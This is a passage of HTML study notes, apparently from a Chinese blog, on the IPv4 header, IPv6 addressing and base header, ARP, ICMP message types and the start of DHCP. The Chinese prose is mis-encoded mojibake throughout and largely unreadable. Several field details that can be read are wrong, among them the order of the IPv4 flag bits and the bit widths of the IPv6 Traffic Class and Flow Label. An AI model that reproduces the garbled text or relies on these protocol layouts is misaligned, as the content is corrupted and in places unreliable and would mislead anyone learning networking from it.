<p>Headeræ˜¯IPv4æ•°æ®æŠ¥é¦–éƒ¨,å…¶ä¸­Optionä¸ºå¯é€‰é¡¹,é™¤æ­¤ä¹‹å¤–çš„å‰20ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„</p>
<h5 id="VER"><a href="#VER" class="headerlink" title="VER"></a>VER</h5><p>4bits</p>
<p>IPåè®®çš„ç‰ˆæœ¬å·,ç›®å‰åªæœ‰4å’Œ6ä¸¤ç§,ä»£è¡¨IPv4,IPv6</p>
<p>ä¸¤ç§IPåè®®çš„é¦–éƒ¨æœ‰åŒºåˆ«,ä½†æ˜¯æ¥æ”¶æ–¹åªè¦æ˜¯çœ‹åˆ°è¿™ä¸ªVERå­—æ®µ,å°±å¯ä»¥å†³å®šåé¢ç”¨IPv6è¿˜æ˜¯IPv4åè®®æ¥è§£é‡Šåé¢çš„æ•°æ®æŠ¥äº†</p>
<h5 id="HLEN"><a href="#HLEN" class="headerlink" title="HLEN"></a>HLEN</h5><p>4bits</p>
<p>ç”±äºå­˜åœ¨Optionè¿™ä¸ªå˜é‡,ä¸ºäº†åŒºåˆ†é¦–éƒ¨å’Œæ•°æ®,éœ€è¦ç»´æŠ¤ä¸€ä¸ªå€¼,è®°å½•IPv4æ•°æ®æŠ¥çš„é¦–éƒ¨å…±æœ‰å¤šå°‘å­—èŠ‚.è¿™ä¸ªå€¼å°±æ”¾åœ¨HLENå­—æ®µ,å…±4ä½,æœ€å¤§æ˜¯15,å•ä½æ˜¯4å­—èŠ‚,ä¹Ÿå°±æ˜¯è¯´,IPv4é¦–éƒ¨æœ€å¤§å¯ä»¥æ˜¯15*4&#x3D;60å­—èŠ‚,å³Optionæœ€å¤§æ˜¯40å­—èŠ‚</p>
<p>ç”±äºé¦–éƒ¨æœ€å°æ˜¯20å­—èŠ‚,å› æ­¤HLENè¿™ä¸ªå€¼æœ€å°æ˜¯5</p>
<h5 id="SERVICE"><a href="#SERVICE" class="headerlink" title="SERVICE"></a>SERVICE</h5><p>8bits</p>
<p>è¦ä¹ˆè¡¨ç¤ºæœåŠ¡ç±»å‹</p>
<p>è¦ä¹ˆè¡¨ç¤ºåŒºåˆ†æœåŠ¡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185352059.png" alt="image-20221031185352059"></p>
<h6 id="æœåŠ¡ç±»å‹"><a href="#æœåŠ¡ç±»å‹" class="headerlink" title="æœåŠ¡ç±»å‹"></a>æœåŠ¡ç±»å‹</h6><p>ç”¨äºè·å¾—æ›´å¥½çš„æœåŠ¡</p>
<blockquote>
<p>æ³¨æ„æœåŠ¡ç±»å‹ä¸æ˜¯é«˜å±‚åè®®ç±»å‹</p>
<p>è¿è¾“å±‚ä¸Šä½¿ç”¨çš„æ˜¯TCPè¿˜æ˜¯UDPç­‰ç­‰,æ˜¯ç”±Protocolå­—æ®µå†³å®šçš„</p>
</blockquote>
<p>ç”¨äºæè¿°ä¸Šå±‚(è¿è¾“å±‚)çš„æœåŠ¡ç±»å‹,</p>
<p>å‰3bitsç”¨äºæè¿°ä¼˜å…ˆçº§</p>
<p>å1bitsä¸ä½¿ç”¨</p>
<p>ä¸­é—´4bits,DTRC,ç”¨äºæè¿°æœåŠ¡ç±»å‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153218410.png" alt="image-20230212153218410"></p>
<h6 id="å·®åˆ†æœåŠ¡"><a href="#å·®åˆ†æœåŠ¡" class="headerlink" title="å·®åˆ†æœåŠ¡"></a>å·®åˆ†æœåŠ¡</h6><p>å‰6bitsæ˜¯ç ç‚¹å­å­—æ®µ,åé¢2bitsä¸ç”¨</p>
<p>å…¶ä¸­ç ç‚¹çš„ä¸åŒç»„åˆæœ‰ä¸åŒçš„æ„ä¹‰</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185950842.png" alt="image-20221031185950842"></p>
<h5 id="Total-Length"><a href="#Total-Length" class="headerlink" title="Total Length"></a>Total Length</h5><p>16bits</p>
<p>æ€»é•¿åº¦,len(header + data),å•ä½,å­—èŠ‚</p>
<p>æœ€å¤§é•¿åº¦ä¸è¶…è¿‡$2^{16}&#x3D;65536bytes$</p>
<p>åˆæ€»é•¿åº¦ä¸èƒ½è¶…è¿‡é“¾è·¯å±‚è§„å®šçš„æœ€å¤§ä¼ é€å•å…ƒMTU,ä»¥å¤ªç½‘(æ­£åœ¨ä½¿ç”¨çš„å±€åŸŸç½‘è§„èŒƒ)è¯¥å€¼é»˜è®¤æ˜¯1500å­—èŠ‚</p>
<p>ä»¥å¤ªç½‘é“¾è·¯å±‚å¸§é™åˆ¶ä¸Šå±‚çš„æ•°æ®æŠ¥é•¿åº¦åœ¨46~1500å­—èŠ‚ä¹‹é—´,ä¸å¤Ÿ46å­—èŠ‚éœ€è¦å¡«å……</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194233356.png" alt="MTU"></p>
<p>ä¹Ÿå°±æ˜¯è¯´é“¾è·¯å±‚çš„åè®®,å…¶Headeråˆ°Trailerä¹‹é—´çš„ç©ºé—´æœ‰é™,æœ€å¤§æ˜¯MTUè§„å®šçš„å¤§å°,IPæ•°æ®æŠ¥å¿…é¡»å°Šé‡åœ°åŸŸå·®å¼‚,å…¥ä¹¡éšä¿—</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153927371.png" alt="image-20230212153927371"></p>
<h5 id="Identification"><a href="#Identification" class="headerlink" title="Identification"></a>Identification</h5><p>16bits</p>
<p>ä¸€æ®µæ•°æ®ç”±äºMTUçš„é™åˆ¶,å¯èƒ½è¦åˆ†æˆå¤šä¸ªåŒ…å‘é€,æœ¬å­—æ®µç”¨æ¥è¡¨æ˜å“ªäº›åŒ…æ˜¯åŒä¸€ä¸ªæ–‡ä»¶çš„.</p>
<h5 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h5><p>3bits</p>
<p>æ ‡å¿—,ç”¨äºæ ‡è¯†è¯¥æ•°æ®æŠ¥æ˜¯å¦å¯ä»¥åˆ†ç‰‡,å¦‚æœåˆ†ç‰‡,æ˜¯ä¸æ˜¯æœ€åä¸€ç‰‡</p>
<p>æœ€å‰é¢ä¸€ä¸ªbitä¸ç”¨</p>
<p>ä¸­é—´ä¸€ä¸ªbitæ˜¯MFä½,è¡¨å¾æ˜¯å¦è¿˜æœ‰åˆ†ç‰‡,1åˆ™è¿˜æœ‰åˆ†ç‰‡,0åˆ™è¡¨æ˜è¯¥æ•°æ®æŠ¥æ˜¯æœ€åä¸€ä¸ªåˆ†ç‰‡</p>
<p>æœ€åä¸€ä¸ªbitæ˜¯DFä½,è¡¨å¾æ˜¯å¦å¯ä»¥åˆ†ç‰‡,1ä¸èƒ½åˆ†ç‰‡,0å…è®¸åˆ†ç‰‡</p>
<table>
<thead>
<tr>
<th>reserved</th>
<th>MF</th>
<th>DF</th>
</tr>
</thead>
</table>
<h5 id="Fragmentation-Offset"><a href="#Fragmentation-Offset" class="headerlink" title="Fragmentation Offset"></a>Fragmentation Offset</h5><p>13bits</p>
<p>åˆ†ç‰‡åç§»,å¯¹äºåŒä¸€ä¸ªåŒ…çš„åˆ†ç‰‡,</p>
<p>æŒ‡å‡ºè¾ƒé•¿çš„åˆ†ç»„åœ¨åˆ†ç‰‡å,å…¶ä¸­ä¸€ç‰‡åœ¨åŸåˆ†ç»„ä¸­çš„ç¼–å·.å•ä½:8å­—èŠ‚<br>$$<br>åˆ†ç‰‡åç§»&#x3D;IPæ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç¼–å·&#x2F;8<br>$$</p>
<p>$8\times 2^{13}&#x3D;2^{16}&#x3D;65536bytes$</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194849825.png" alt="image-20221031194849825"></p>
<blockquote>
<p>æœ¬æœºåœ¨10.177.148.9,ä½¿ç”¨ICMPåè®®ç»™61.150.43.78å‘é€3500ä¸ªå­—èŠ‚çš„æ•°æ®</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ping www.xidian.edu.cn -l 3500</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ä¸€ç»„ping-pongåº”ç­”:</p>
<p>å»çš„åŒ…æœ‰ä¸‰ä¸ª,åˆ†åˆ«é•¿1514,1514,587å­—èŠ‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201439099.png"></p>
<p>ä¸ºå•¥å¯ä»¥æ¯”mtu&#x3D;1500å¤š?å› ä¸ºè¿™æ˜¯æ•´ä¸ªæ•°æ®æŠ¥çš„æ€»é•¿åº¦,åŒ…æ‹¬äº†é“¾è·¯å±‚çš„å¤´</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201739441.png" alt="image-20221031201739441"></p>
<p>å‰ä¸¤ä¸ªæ€»é•¿åº¦1514å­—èŠ‚çš„åŒ…,å®é™…ä¸ŠIPv4æ•°æ®æŠ¥å°±æ˜¯1500å­—èŠ‚,å…¶ä¸­IPv4é¦–éƒ¨å ç”¨äº†20å­—èŠ‚</p>
</blockquote>
<h5 id="Time-to-live"><a href="#Time-to-live" class="headerlink" title="Time to live"></a>Time to live</h5><p>8bits</p>
<p>ç”Ÿå­˜æ—¶é—´TTL,ç”¨äºè¡¨ç¤ºæœ€å¤§è·³æ•°,å³è¯¥åŒ…è¿˜å¯ä»¥é€šè¿‡å¤šå°‘ä¸ªè·¯ç”±å™¨è½¬å‘</p>
<p>ä¸ºäº†é˜²æ­¢æ•°æ®æŠ¥åœ¨ç½‘ç»œä¸Šæ— ä¼‘æ­¢åœ°è¢«è½¬å‘è€Œå ç”¨èµ„æº.è·¯ç”±å™¨åœ¨è½¬å‘æ¯ä¸ªæ•°æ®æŠ¥ä¹‹å‰,éƒ½ä¼šé¦–å…ˆå°†å…¶TTLå‡ä¸€,å¦‚æœé™ä¸º0,åˆ™ä¸¢å¼ƒè¯¥æ•°æ®æŠ¥,ä¸å†è½¬å‘</p>
<h5 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h5><p>8bits</p>
<p>åè®®ç±»å‹,ç”¨äºè¡¨ç¤ºä¸Šå±‚ä½¿ç”¨çš„åè®®,ä¹Ÿå°±æ˜¯dataä¸­å­˜æ”¾çš„æ˜¯å•¥åè®®çš„æ•°æ®æŠ¥</p>
<p>å¸¸ç”¨çš„åè®®ç¼–å·å¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031192637226.png" alt="image-20221031192637226"></p>
<h5 id="Header-checksum"><a href="#Header-checksum" class="headerlink" title="Header checksum"></a>Header checksum</h5><p>16bits</p>
<p>é¦–éƒ¨æ£€æ ¡å’Œ,å’‹ç®—çš„å‘¢?</p>
<p>è¿™é‡Œçš„é¦–éƒ¨åŒ…å«Optionå­—æ®µ,å¹¶ä¸”é¦–éƒ¨ä¸€å®šæ˜¯4å­—èŠ‚å¯¹é½çš„,Optionå¦‚æœä¸æ˜¯4å­—èŠ‚çš„å€æ•°åˆ™å‘ä¸Šå–æ•´åˆ°4å­—èŠ‚çš„å€æ•°</p>
<p>è®¡ç®—æ–¹å¼:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193058326.png" alt="image-20221031193058326"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯å‘é€æ–¹æœ€ç»ˆå¡«å†™çš„Check Sumæ˜¯æ ¡éªŒå’Œè®¡ç®—å€¼çš„åç </p>
<p>æ¥æ”¶æ–¹ä¹Ÿæ˜¯å°†æ ¡éªŒå’Œè®¡ç®—ç»“æœå–åæ£€æŸ¥æ˜¯å¦æ˜¯å…¨é›¶</p>
<p>æ¯”å¦‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193231527.png" alt="image-20221031193231527"></p>
<h5 id="Source-Destination-IP-address"><a href="#Source-Destination-IP-address" class="headerlink" title="Source&#x2F;Destination IP address"></a>Source&#x2F;Destination IP address</h5><p>åˆ†åˆ«æ˜¯32bits,æºå’Œç›®çš„ä¸»æœºçš„IPåœ°å€</p>
<h5 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h5><p>å¯ä»¥æ²¡æœ‰,æœ€å¤§40å­—èŠ‚</p>
<p>é¦–éƒ¨é™„åŠ é€‰é¡¹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031202035076.png" alt="image-20221031202035076"></p>
<h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><h4 id="IPv6åœ°å€"><a href="#IPv6åœ°å€" class="headerlink" title="IPv6åœ°å€"></a>IPv6åœ°å€</h4><p>é•¿128ä½</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208205753221.png" alt="image-20230208205753221"></p>
<p>æ‡’äººè¡¨ç¤ºæ³•:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210147178.png" alt="image-20230208210147178"></p>
<p>å…¨é›¶çš„æ®µå¯ä»¥åªå†™ä¸€ä¸ª0</p>
<p>è¿ç»­çš„å…¨é›¶æ®µå¯ä»¥ç”¨ä¸€ä¸ªGapä»£æ›¿,å…¨é›¶æ®µä¹‹é—´çš„å†’å·å¯ä»¥çœå»äº†.ä½†æ˜¯ä¸€ä¸ªIPv6åœ°å€ä¸­<strong>åªèƒ½æœ‰ä¸€ä¸ªGap</strong></p>
<blockquote>
<p>ä¸ºå•¥åªèƒ½æœ‰ä¸€ä¸ªGAP?çœ‹çœ‹å¦‚ä½•è¿˜åŸ</p>
</blockquote>
<p>å¸¦æœ‰Gapçš„åœ°å€å¦‚ä½•è¿˜åŸ?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210408867.png" alt="image-20230208210408867"></p>
<h4 id="IPv6åŒ…"><a href="#IPv6åŒ…" class="headerlink" title="IPv6åŒ…"></a>IPv6åŒ…</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154305058.png" alt="image-20230212154305058"></p>
<p>IPv6å¤´éƒ¨åŒ…æ‹¬å›ºå®š40ä¸ªå­—èŠ‚çš„åŸºç¡€å¤´éƒ¨å’Œå¯å˜é•¿åº¦çš„æ‹“å±•å¤´éƒ¨,æ‹“å±•å¤´éƒ¨çš„é•¿åº¦ä¼šåœ¨åŸºç¡€å¤´éƒ¨ä¸­ç»™å‡º</p>
<h5 id="Base-Header"><a href="#Base-Header" class="headerlink" title="Base Header"></a>Base Header</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154406661.png" alt="image-20230212154406661"></p>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>ä½œç”¨</th>
<th>é•¿åº¦(bit)</th>
</tr>
</thead>
<tbody><tr>
<td>Version</td>
<td>IPv6ç‰ˆæœ¬</td>
<td>4</td>
</tr>
<tr>
<td>Traffic Class</td>
<td>ä¼˜å…ˆçº§,å‘ç”Ÿæ‹¥å¡æ—¶åˆ†ç»„çš„ä¼˜å…ˆçº§</td>
<td>4</td>
</tr>
<tr>
<td>Flow Label</td>
<td>æµæ ‡å·,ç±»ä¼¼äºä¹‹å‰çš„Identification</td>
<td>24</td>
</tr>
<tr>
<td>Payload Length</td>
<td>æœ‰æ•ˆè½½è·é•¿åº¦,å³æ‹“å±•å¤´+IPæ•°æ®çš„é•¿åº¦,å•ä½:å­—èŠ‚</td>
<td>16</td>
</tr>
<tr>
<td>Next Header</td>
<td>æŒ‡æ˜ä¸Šå±‚åè®®,ç±»ä¼¼äºProtocol</td>
<td>8</td>
</tr>
<tr>
<td>Hop Limit</td>
<td>TTL</td>
<td></td>
</tr>
<tr>
<td>Source&#x2F;<br />Destination Address</td>
<td>æº&#x2F;ç›®çš„åœ°å€</td>
<td>128&#x2F;128</td>
</tr>
</tbody></table>
<h4 id="IPv4å‘IPv6è¿‡æ¸¡"><a href="#IPv4å‘IPv6è¿‡æ¸¡" class="headerlink" title="IPv4å‘IPv6è¿‡æ¸¡"></a>IPv4å‘IPv6è¿‡æ¸¡</h4><p>ä¸‰ç§è¿‡æ¸¡æ–¹æ³•:</p>
<table>
<thead>
<tr>
<th>è¿‡æ¸¡æ–¹æ³•</th>
<th>åŸç†</th>
</tr>
</thead>
<tbody><tr>
<td>åŒåè®®æ ˆ</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155148399.png" alt="image-20230212155148399" style="zoom:25%;" /></td>
</tr>
<tr>
<td>éš§é“</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155201345.png" alt="image-20230212155201345" style="zoom:25%;" /></td>
</tr>
<tr>
<td>å¤´è½¬æ¢</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155229167.png" alt="image-20230212155229167" style="zoom:25%;" /></td>
</tr>
</tbody></table>
<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><h4 id="æ•°æ®æŠ¥"><a href="#æ•°æ®æŠ¥" class="headerlink" title="æ•°æ®æŠ¥"></a>æ•°æ®æŠ¥</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101171944341.png" alt="image-20221101171944341"></p>
<h5 id="Hardware-Type"><a href="#Hardware-Type" class="headerlink" title="Hardware Type"></a>Hardware Type</h5><p>16bits</p>
<p>é“¾è·¯å±‚åè®®ç±»å‹,ä»¥å¤ªç½‘ä¸º1</p>
<h5 id="Protocol-Type"><a href="#Protocol-Type" class="headerlink" title="Protocol Type"></a>Protocol Type</h5><p>16bits</p>
<p>ç½‘ç»œå±‚åè®®ç±»å‹,IPåè®®ä¸º0x0800</p>
<h5 id="Hardware-length"><a href="#Hardware-length" class="headerlink" title="Hardware length"></a>Hardware length</h5><p>8bits</p>
<p>ç‰©ç†åœ°å€é•¿åº¦,æ¯”å¦‚ä»¥å¤ªç½‘çš„ç‰©ç†åœ°å€,å³MACåœ°å€çš„é•¿åº¦å°±æ˜¯6å­—èŠ‚</p>
<h5 id="Protocol-length"><a href="#Protocol-length" class="headerlink" title="Protocol length"></a>Protocol length</h5><p>8bits</p>
<p>é€»è¾‘åœ°å€é•¿åº¦,æ¯”å¦‚IPv4åœ°å€çš„é•¿åº¦å°±æ˜¯4å­—èŠ‚</p>
<h5 id="Operation"><a href="#Operation" class="headerlink" title="Operation"></a>Operation</h5><p>16bits</p>
<p>ARPåˆ†ç»„ç±»å‹,æœ‰ä¸¤ç§,Requestè¯·æ±‚æˆ–è€…Replyåº”ç­”</p>
<h5 id="å››ä¸ªåœ°å€"><a href="#å››ä¸ªåœ°å€" class="headerlink" title="å››ä¸ªåœ°å€"></a>å››ä¸ªåœ°å€</h5><p>æ¥ä¸‹æ¥æ˜¯å››ä¸ªåœ°å€,ä¾æ¬¡æ˜¯å‘é€æ–¹çš„ç‰©ç†åœ°å€,å‘é€æ–¹é€»è¾‘åœ°å€,æ¥æ”¶æ–¹ç¡¬ä»¶åœ°å€,æ¥æ”¶æ–¹é€»è¾‘åœ°å€</p>
<h4 id="æŠ“åŒ…è§‚å¯Ÿ"><a href="#æŠ“åŒ…è§‚å¯Ÿ" class="headerlink" title="æŠ“åŒ…è§‚å¯Ÿ"></a>æŠ“åŒ…è§‚å¯Ÿ</h4><p>å¦‚å›¾æ‹“æ‰‘ä¸­</p>
<p><a href="mailto:&#65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#50;&#x35;&#49;">&#65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#49;&#x2e;&#50;&#x35;&#49;</a>è¯•å›¾ping <a href="mailto:&#x42;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#49;&#x2e;&#50;&#x35;&#x30;">&#x42;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#49;&#x2e;&#50;&#x35;&#x30;</a></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101172908748.png" alt="image-20221101172908748"></p>
<p>åœ¨Açš„Ethernet0ç½‘å¡ä¸ŠæŠ“åŒ…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173100332.png" alt="image-20221101173100332"></p>
<p>ä¼šå‘ç°é¦–å…ˆå‘é€å’Œæ¥å—çš„å¹¶ä¸æ˜¯ICMPæŠ¥æ–‡,è€Œæ˜¯arpæŠ¥æ–‡,å› ä¸ºæ­¤æ—¶Aè®¡ç®—æœºå¹¶ä¸çŸ¥é“<a href="mailto:&#66;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#53;&#x30;">&#66;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#50;&#53;&#x30;</a>çš„ç‰©ç†åœ°å€æ˜¯å¤šå°‘.å› æ­¤é¦–å…ˆè¦é—®ä¸€ä¸‹</p>
<p>ç¬¬20å¸§,Aå‘å­ç½‘å‘é€ARPå¹¿æ’­,å…¶æŠ¥æ–‡ä¸­åŒ…æ‹¬è‡ªå·±çš„ç‰©ç†åœ°å€,é€»è¾‘åœ°å€,ç›®çš„åœ°çš„é€»è¾‘åœ°å€,ä½†æ˜¯ç›®çš„åœ°å€çš„ç‰©ç†åœ°å€æ˜¯ä¸€ä¸ªå‡å€¼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173242804.png" alt="image-20221101173242804"></p>
<p>ç¬¬21å¸§,Aæ¥æ”¶åˆ°äº†Bçš„å•æ’­å›ç­”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101173435707.png" alt="image-20221101173435707"></p>
<p>æ­¤æ—¶ä¸¤ä¸ªä¸»æœºçš„ç‰©ç†åœ°å€,é€»è¾‘åœ°å€éƒ½å·²ç»å¡«å¥½äº†</p>
<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>internet control message protocol å› ç‰¹ç½‘æ§åˆ¶åè®®,ç½‘ç»œå±‚åè®®</p>
<p>ICMPæ˜¯<strong>ç½‘ç»œå±‚çš„åè®®</strong>,ä½†æ˜¯å…¶åœ¨æ•°æ®å¸§ä¸­çš„ä½ç½®ç±»ä¼¼äºTCPæ•°æ®æŠ¥çš„ä½ç½®,éƒ½æ˜¯åœ¨IPv4çš„dataä½ç½®</p>
<h4 id="æŠ¥æ–‡æ ¼å¼"><a href="#æŠ¥æ–‡æ ¼å¼" class="headerlink" title="æŠ¥æ–‡æ ¼å¼"></a>æŠ¥æ–‡æ ¼å¼</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234511301.png" alt="image-20221101234511301"></p>
<h5 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h5><p>ICMPæŠ¥æ–‡åˆ†æˆå·®é”™æŠ¥å‘Šå’ŒæŸ¥è¯¢ä¸¤ç§,ä½“ç°åœ¨Typeä¸Š</p>
<p>å¯¹äºå·®é”™æŠ¥å‘ŠæŠ¥æ–‡:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234922337.png" alt="å·®é”™æŠ¥å‘Šç±»å‹"></p>
<p>å¯¹äºæŸ¥è¯¢æŠ¥æ–‡:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101234949153.png" alt="æŸ¥è¯¢ç±»å‹"></p>
<h5 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h5><p>ä»£ç è¦è§†æŠ¥æ–‡ç±»å‹å†³å®š</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101235149110.png" alt="image-20221101235149110"></p>
<h5 id="Checksum"><a href="#Checksum" class="headerlink" title="Checksum"></a>Checksum</h5><p>æ ¡éªŒå’Œ</p>
<h4 id="å·®é”™æŠ¥å‘ŠæŠ¥æ–‡"><a href="#å·®é”™æŠ¥å‘ŠæŠ¥æ–‡" class="headerlink" title="å·®é”™æŠ¥å‘ŠæŠ¥æ–‡"></a>å·®é”™æŠ¥å‘ŠæŠ¥æ–‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â  å¯¹äºæºå¸¦ICMPå·®é”™æŠ¥æ–‡çš„æ•°æ®æŠ¥ï¼Œä¸å†ç”Ÿäº§ICMPå·®é”™æŠ¥æ–‡ã€‚</span><br><span class="line">â  å¯¹åˆ†æ®µçš„æ•°æ®æŠ¥æ–‡ï¼Œåªå¯¹ç¬¬ä¸€ä¸ªåˆ†æ®µäº§ç”ŸICMPå·®é”™æŠ¥æ–‡ã€‚</span><br><span class="line">â  å¯¹äºå¤šæ’­åœ°å€çš„æ•°æ®æŠ¥æ–‡ï¼Œä¸äº§ç”ŸICMPå·®é”™æŠ¥æ–‡ã€‚</span><br><span class="line">â å…·æœ‰ç‰¹æ®Šåœ°å€çš„æ•°æ®æŠ¥æ–‡ï¼Œå¦‚127.0.0.0æˆ–è€…0.0.0.0ï¼Œä¸äº§ç”ŸICMPå·®é”™æŠ¥æ–‡ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å·®é”™æŠ¥æ–‡æ•°æ®å­—æ®µ:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212160806776.png" alt="image-20230212160806776"></p>
<table>
<thead>
<tr>
<th>å·®é”™æŠ¥å‘Šç±»å‹</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>ç›®çš„ç«¯ä¸å¯è¾¾</td>
<td>è·¯ç”±å™¨æ— æ³•è·¯ç”±æˆ–è€…ç›®çš„ä¸»æœºæ— æ³•ä¼ é€’æ•°æ®æ—¶,æŠ¥å‘Šç›®çš„ç«¯ä¸å¯è¾¾</td>
<td></td>
</tr>
<tr>
<td>æºç«¯æŠ‘åˆ¶</td>
<td>é…åˆæµé‡æ§åˆ¶ä½¿ç”¨<br />è·¯ç”±å™¨æˆ–è€…ç›®çš„ä¸»æœºå‘ç”Ÿæ‹¥å¡æ—¶,ä¸¢å¼ƒæ•°æ®åŒ…,å‘é€æºç«¯æŠ‘åˆ¶</td>
<td></td>
</tr>
<tr>
<td>æ—¶é—´è¶…æ—¶</td>
<td>TTLå‡ä¸º0æ—¶,è·¯ç”±å™¨ä¸¢å¼ƒ<br />æˆ–è€…æŠ¥æ–‡çš„éƒ¨åˆ†åˆ†ç‰‡æ²¡æœ‰åœ¨æœ‰é™æ—¶é—´æŠµè¾¾ç›®çš„ä¸»æœº,ç”±ç›®çš„ä¸»æœºå‘é€</td>
<td></td>
</tr>
<tr>
<td>å‚æ•°é—®é¢˜</td>
<td>IPåˆ†ç»„é¦–éƒ¨é”™è¯¯<br />è·¯ç”±å™¨æˆ–è€…ç›®çš„ä¸»æœºä¸¢å¼ƒåˆ†ç»„å¹¶å‘é€å‚æ•°é—®é¢˜æŠ¥æ–‡</td>
<td></td>
</tr>
<tr>
<td>é‡å®šå‘</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161420556.png" alt="image-20230212161420556" style="zoom:25%;" /><br />å‘æºç«¯æŠ¥å‘Šæ›´å¥½çš„è·¯ç”±</td>
<td></td>
</tr>
</tbody></table>
<h4 id="æŸ¥è¯¢æŠ¥æ–‡"><a href="#æŸ¥è¯¢æŠ¥æ–‡" class="headerlink" title="æŸ¥è¯¢æŠ¥æ–‡"></a>æŸ¥è¯¢æŠ¥æ–‡</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212161525556.png" alt="image-20230212161525556"></p>
<table>
<thead>
<tr>
<th>æŸ¥è¯¢æŠ¥æ–‡ç±»å‹</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>å›é€è¯·æ±‚å’Œå›ç­”</td>
<td>è¯Šæ–­ç½‘ç»œ</td>
<td>ping</td>
</tr>
<tr>
<td>æ—¶é—´æˆ³è¯·æ±‚å’Œå›ç­”</td>
<td>ç¡®å®šæ•°æ®æŠ¥å¾€è¿”æ—¶é—´,åŒæ­¥</td>
<td></td>
</tr>
<tr>
<td>åœ°å€æ©ç è¯·æ±‚å’Œå›ç­”</td>
<td>è·å–åœ°å€å¯¹åº”æ©ç </td>
<td></td>
</tr>
<tr>
<td>è·¯ç”±å™¨è¯¢é—®å’Œé€šå‘Š</td>
<td>è¯¢é—®è·¯ç”±å™¨æ˜¯å¦æ­£å¸¸å·¥ä½œ</td>
<td>tracert</td>
</tr>
</tbody></table>
<h5 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/5337919-d1900102224993c8.png" alt="img"></p>
<h3 id="DHCPåè®®"><a href="#DHCPåè®®" class="headerlink" title="DHCPåè®®"></a>DHCPåè®®</h3><p>DHCP,Dynamic Host Configuration Protocol,åŠ¨æ€ä¸»æœºåœ°å€åˆ†é…åè®®</p>
